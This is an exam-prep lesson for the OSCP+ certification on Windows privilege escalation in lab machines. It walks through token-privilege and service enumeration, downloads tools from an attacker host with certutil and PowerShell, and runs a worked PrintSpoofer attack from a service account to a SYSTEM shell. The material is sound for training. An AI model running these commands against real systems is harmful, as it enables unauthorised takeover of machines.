Lesson 07 · Privilege Escalation

Windows Privilege Escalation

Mission: pass the OSCP+ exam · Your win today: take a low-priv Windows shell to SYSTEM/Administrator by finding one misconfiguration.

You have a shell as iis apppool\defaultapppool or some other low-priv service account. That's 10 points; SYSTEM is the other 10. This lesson is the twin of Lesson 06 — same reflex, different OS. You don't need a 0-day. You enumerate inward, find the one thing this box got wrong, and ride it to the highest token on the machine. On Windows that machine almost always handed you the win before you arrived.

Different OS, same reflex.
Enumerate inward, find the one misconfiguration.

Step 1 · Situate yourself

Before hunting, answer "who am I, what do I already hold, and what is this box?" On Windows the cheapest tell is your token privileges — a single command frequently shows you already have everything you need:

C:\> whoami /priv        # token privileges — the cheapest tell on Windows
C:\> whoami /groups      # am I in a privileged group? (Administrators, Backup Operators...)
C:\> whoami /all         # everything at once: user, groups, privileges
C:\> systeminfo          # OS build + installed hotfixes (feeds kernel-exploit triage)
C:\> net user            # local users; "net user bob" for one account's groups
C:\> net localgroup administrators   # who is already admin
C:\> ipconfig /all        # interfaces — note a second NIC (a pivot for later)

The instinct to build first: when whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, you are usually one binary away from SYSTEM. That is so common on service-account shells that it is the very first thing to look for.

Step 2 · Sweep with WinPEAS — then read it

Drop WinPEAS to enumerate the host fast, but read the red/yellow hits rather than outsourcing your judgement — same discipline as LinPEAS in Lesson 06.

C:\> winPEASx64.exe            # full sweep; the .bat variant needs no binary drop
C:\> winPEASany.exe quiet servicesinfo   # target one category to cut the noise

WinPEAS colour-codes findings: red = very likely exploitable, yellow = worth a look. Useful alternatives, each with a different bias:

ToolWhat it is best at
WinPEASBroad first sweep; colour-coded priorities across every vector
PrivescCheck.ps1PowerShell, no binary to drop; clean service + registry checks
SeatbeltC#; deep host survey (credentials, autologon, scheduled tasks)

The vectors these surface are almost always one of the rows below. Learn the table; the tools just point at the row.

Step 3 · The vectors that win Windows boxes

Order of operations — token before kernel Work cheap-and-safe before risky: token privileges → service misconfigs → stored creds → registry (AlwaysInstallElevated) → kernel exploit last. ALWAYS run whoami /priv first — so many service-account shells already hold SeImpersonate that a Potato is your fastest path to SYSTEM and you skip the rest. A kernel exploit can blue-screen the machine and burn your exam time; exhaust misconfigurations first.

How to read each tell

The commands that confirm a service vector are worth memorising — these three answer most service questions:

C:\> wmic service get name,displayname,pathname,startmode   # spot unquoted paths + spaces
C:\> sc qc <service>            # BINARY_PATH_NAME + SERVICE_START_NAME (who it runs as)
C:\> accesschk.exe -uwcqv "user" *   # services THIS user can modify (SERVICE_CHANGE_CONFIG = win)

For the registry vectors, two one-liners confirm a free SYSTEM shell:

C:\> reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\> reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# both must return 0x1. One alone does nothing.

Step 4 · Get your tools onto the box

You'll need to drop WinPEAS, PrintSpoofer, or accesschk onto the target. Stand up a quick HTTP or SMB server on your attacker box (10.10.14.5) and pull. certutil is the classic Windows-native fetch (a LOLBAS living-off-the-land binary):

# --- on your attacker box: serve the file ---
$ python3 -m http.server 80

# --- on the target: certutil (native, often unblocked) ---
C:\> certutil -urlcache -f http://10.10.14.5/winPEASx64.exe wp.exe

# --- or PowerShell ---
C:\> powershell -c "iwr http://10.10.14.5/PrintSpoofer64.exe -OutFile ps.exe"

# --- or SMB: impacket-smbserver, then copy over the share ---
$ impacket-smbserver share . -smb2support
C:\> copy \\10.10.14.5\share\PrintSpoofer64.exe ps.exe

Write to a directory you can actually write to — C:\Windows\Temp and your own profile are safe bets when the working directory is locked down.

Worked example — SeImpersonatePrivilege → PrintSpoofer → SYSTEM

The single most common modern Windows service privesc. You land a shell from a web/MSSQL foothold and check your token first:

C:\> whoami
iis apppool\defaultapppool
C:\> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                        State
============================= ================================== =======
SeImpersonatePrivilege        Impersonate a client after auth    Enabled
SeCreateGlobalPrivilege       Create global objects              Enabled

SeImpersonatePrivilege is Enabled — that is the whole game. Fetch PrintSpoofer, then have it impersonate a SYSTEM token and hand you an interactive shell:

C:\> certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe ps.exe
C:\> ps.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\> whoami
nt authority\system
C:\> type C:\Users\Administrator\Desktop\proof.txt
a1b2c3d4e5f6...   (the second 10 points)

SYSTEM. The pattern generalises across the Potatoes: if you can impersonate, you can become SYSTEM. Record the exact path you took — token vector, tool, command — in your box notes; that note is what makes the next box faster.

If a Potato fails PrintSpoofer is the modern default. On older boxes (Server 2016 / Windows 10 1809 and earlier) JuicyPotato still works; on most current builds reach for GodPotato or RoguePotato. Same prerequisite every time: SeImpersonate or SeAssignPrimaryToken in your token. Confirm the privilege, then pick the Potato that matches the OS build.
